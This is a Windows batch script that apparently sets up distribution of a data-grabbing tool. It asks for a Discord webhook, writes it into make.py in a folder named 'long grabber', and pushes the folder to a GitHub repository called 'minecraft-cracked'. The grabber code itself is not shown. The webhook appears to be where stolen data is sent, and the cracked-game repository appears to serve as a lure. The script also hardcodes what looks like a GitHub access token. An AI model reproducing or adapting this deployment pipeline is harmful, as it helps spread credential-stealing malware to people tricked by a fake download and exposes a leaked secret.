@echo off
setlocal enabledelayedexpansion

:: Define variables
set "webhook="
set "githubUser=kamielvandereyt"
set "githubToken=gLWFXx106ZTza3mQSzvMsuU7Y1tQ4rohp_OfwWrd"
set "repoName=minecraft-cracked"
set "branch=main"
set "sourceDir=C:\Users\longf\OneDrive - HAST Katholiek Onderwijs\long grabber"

:: Function to prompt user for Discord webhook URL
:InputWebhook
cls
set /p webhook=Enter Discord webhook URL:
if "%webhook%"=="" (
    echo Please enter a valid Discord webhook URL.
    goto :InputWebhook
)

:: Prompt for GitHub credentials
:InputGithub
cls
set /p githubUser=Enter GitHub username:
set /p githubToken=Enter GitHub personal access token:
set /p repoName=Enter GitHub repository name:
if "%githubUser%"=="" (
    echo Please enter a valid GitHub username.
    goto :InputGithub
)
if "%githubToken%"=="" (
    echo Please enter a valid GitHub personal access token.
    goto :InputGithub
)
if "%repoName%"=="" (
    echo Please enter a valid GitHub repository name.
    goto :InputGithub
)

:: Check if git is installed, if not install it
where git >nul 2>nul
if %errorlevel% neq 0 (
    echo git is not installed. Installing git...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/git-for-windows/git/releases/download/v2.31.1.windows.1/MinGit-2.31.1-busybox-64-bit.zip' -OutFile 'git.zip'"
    powershell -Command "Expand-Archive -Path 'git.zip' -DestinationPath '.'"
    set "PATH=%cd%\MinGit-2.31.1-busybox-64-bit\cmd\;%PATH%"
    del /q git.zip
)

:: Add webhook to make.py
set "makeScriptPath=%sourceDir%\make.py"
powershell -Command "Get-Content %makeScriptPath% | ForEach-Object { $_ -replace 'webhook\s*:\s*''https://[^'']+', 'webhook'': ''%webhook%'' } | Set-Content %makeScriptPath%"

:: Initialize Git repository and commit files
cd "%sourceDir%"
git init
git remote add origin https://%githubUser%:%githubToken%@github.com/%githubUser%/%repoName%.git
git checkout -b %branch%
git add .
git commit -m "Initial commit"
git push -u origin %branch%

echo Script completed successfully.
pause
exit /b 0
